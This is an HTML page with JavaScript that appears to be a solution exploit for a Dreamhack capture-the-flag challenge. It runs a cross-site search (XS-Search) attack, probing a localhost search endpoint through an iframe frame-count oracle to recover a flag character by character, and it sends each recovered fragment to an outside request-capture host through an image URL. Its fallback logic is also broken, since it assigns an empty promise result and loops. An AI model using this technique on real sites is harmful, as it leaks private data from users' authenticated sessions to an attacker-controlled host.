<iframe id="iframe"></iframe>
<img id="img">
<script>
    async function req(url) {
        return await new Promise((resolve, reject) => {
            const iframe = document.getElementById("iframe");
            iframe.src = url;
            iframe.onload = () => { 
                if (iframe.contentWindow.frames.length != 0)
                    return resolve();
                else
                    return reject();
            };
        });
    }
    async function search(query) {
        try {
            await req(
              `http://localhost:8000/search?query=${query}`
            );
            return true;
        } catch (e) {
            return false;
        }
    }
    // help
async function exploit() {
    let chars = "0123456789abcdef}"
    let secret = "DH{22d1445ad68e194e";
    let nextSearchStart = "";

    while (!secret.includes("}")) {
        let found = false;

        for (let c of chars) {
            if (await search(secret + c)) {
                secret += c;
                img.src = `https://hlavjaw.request.dreamhack.games/${secret}`;
                found = true;
                break;
            }
        }

        if (!found) {
            // 만약 현재 secret 다음에 오는 값이 없다면, 검색 시작 위치를 갱신합니다.
            const response = await req(`http://localhost:8000/search?query=${nextSearchStart}`);
            nextSearchStart = response;
            console.log("Next search start:", nextSearchStart);
        }
    }
}
exploit();
</script>
